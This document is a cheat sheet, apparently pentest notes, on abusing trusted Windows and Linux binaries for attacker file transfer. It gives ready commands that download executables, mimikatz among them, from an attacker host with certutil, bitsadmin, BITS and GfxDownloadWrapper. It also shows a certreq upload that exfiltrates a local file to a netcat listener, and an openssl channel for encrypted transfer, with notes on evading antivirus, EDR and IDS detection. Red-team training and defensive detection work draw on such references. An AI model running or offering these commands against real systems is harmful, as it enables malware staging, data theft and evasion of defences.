# LOLBins & GTFOBins
**Concept:** Attackers use pre-installed, trusted system binaries to conduct operations. **Resources:**
- **Windows:** [LOLBAS Project](https://lolbas-project.github.io/) (Look for `/download` or `/upload`).
- **Linux:** [GTFOBins](https://gtfobins.github.io/) (Look for `+file download` or `+file upload`).
## Windows (LOLBAS)
**Context:** These are Microsoft-signed binaries. Using them often bypasses basic "Block unknown executables" policies, though EDRs heavily monitor specific arguments (like `certutil -urlcache`).
### 1. Certutil (The Classic Downloader)
**Status:** **High Detection Risk.** Most AVs flag this immediately. 
**Mechanism:** Intended for managing certificates, but can verify (download) remote certificates.
```powershell
# -verifyctl: Verify certificate (abused to download)
# -split: Saves the file to disk instead of memory
# -f: Force overwrite
certutil.exe -verifyctl -split -f http://<ATTACKER_IP>/<FILE.exe>
```
### 2. CertReq (Upload / Exfiltration)
**Status:** **Medium Risk.** Often used for sending data _out_. 
**Mechanism:** Designed to submit certificate requests (CSRs) to a Certificate Authority via HTTP POST.

**1. Attacker (Listener):**
```shell
# Listen for the incoming POST request containing the file
sudo nc -lvnp <PORT>
```

**2. Victim (Sender):**
```powershell
# Encode and POST file content to attacker
# Note: Fails if the version doesn't support -Post
certreq.exe -Post -config http://<ATTACKER_IP>:<PORT>/ c:\windows\win.ini
```
### 3. BITS (Background Intelligent Transfer Service)
**Status:** **Stealthy.** Designed to download Windows Updates in the background using idle bandwidth.

**Legacy (cmd.exe):**
```powershell
# Deprecated but still present on all systems
bitsadmin /transfer <JOB_NAME> /priority foreground http://<ATTACKER_IP>/<FILE.exe> C:\Users\Public\<FILE.exe>
```

**Modern (PowerShell):**
```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<ATTACKER_IP>/<FILE.exe>" -Destination "C:\Temp\<FILE.exe>"
```
### 4. Third-Party LOLBins (GfxDownloadWrapper)
**Status:** **Low Detection.** Often overlooked. **Context:** Installed with Intel Graphics Drivers.

```powershell
# Syntax: Executable "URL" "Destination"
GfxDownloadWrapper.exe "http://<ATTACKER_IP>/mimikatz.exe" "C:\Temp\mimikatz.exe"
```
## Linux (GTFOBins)
**Context:** Standard Unix utilities that can be abused.
### OpenSSL (Encrypted Transfer)
**Use Case:** Transfer files over an encrypted SSL channel using standard tools. Bypasses simple IDS signatures looking for cleartext keywords.

**1. Attacker (Setup Server):**
```shell
# 1. Generate a temporary certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# 2. Start Server (Hosting the file)
# -quiet: Less verbose | -accept: Port to listen on
openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < <FILE_TO_SEND>
```

**2. Victim (Client Download):**
```shell
# Connect and write output to file
openssl s_client -connect <ATTACKER_IP>:<PORT> -quiet > <OUTPUT_FILE>
```